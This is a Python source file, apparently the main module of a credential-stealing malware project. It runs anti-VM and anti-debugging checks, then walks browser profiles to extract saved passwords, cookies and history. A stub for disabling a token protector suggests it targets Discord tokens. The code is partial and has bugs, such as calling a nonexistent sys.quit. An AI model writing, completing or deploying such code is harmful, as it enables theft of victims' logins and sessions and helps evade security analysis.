from core import extractor
from core import antivm
from core import sysinfo

import os
import sys

class Main:
    def __init__(self) -> None:
        pass

    def antivm(self):
        if antivm.Antivm.run():
            sys.quit()
        
        antivm.AntiDebug.checks()
        

    def browser(self):
        for browserKey in extractor.browsers_profile:
            browserValue = extractor.browsers_profile[browserKey]

            profiles = ["Default"]

            try:
                for folder in os.listdir(browserValue):
                    if folder.startswith("profile".lower):
                        profiles.append(folder)

                for profile in profiles:
                    browserExtractor = extractor.Extract(browserValue+"\\Local State")
                    history = browserExtractor.extractHistory(browserValue+f"\\{profile}\\History")
                    passwd = browserExtractor.extractPasswd(browserValue+f"\\{profile}\\Login Data")
                    cookies = browserExtractor.extractCookies(browserValue+f"\\{profile}")
            
            except FileNotFoundError:
                continue

        for browserKey in extractor.browsers:
            browserValue = extractor.browsers_profile[browserKey]
            
            try:
                browserExtractor = extractor.Extract(browserValue+"\\Local State")
                history = browserExtractor.extractHistory(browserValue+"\\History")
                passwd = browserExtractor.extractPasswd(browserValue+"\\Login Data")
                cookies = browserExtractor.extractCookies(browserValue)

                print(history)
                print(passwd)
                print(cookies)
            except FileNotFoundError:
                continue

    def steam(self):
        pass

    def token(self):
        extractor.Anti_tokenprotector.killprotector()

    def run(self):
        antivm.Antivm.run()
        antivm.AntiDebug().checks()

        self.browser()

if __name__ == "__main__":
    Main().run()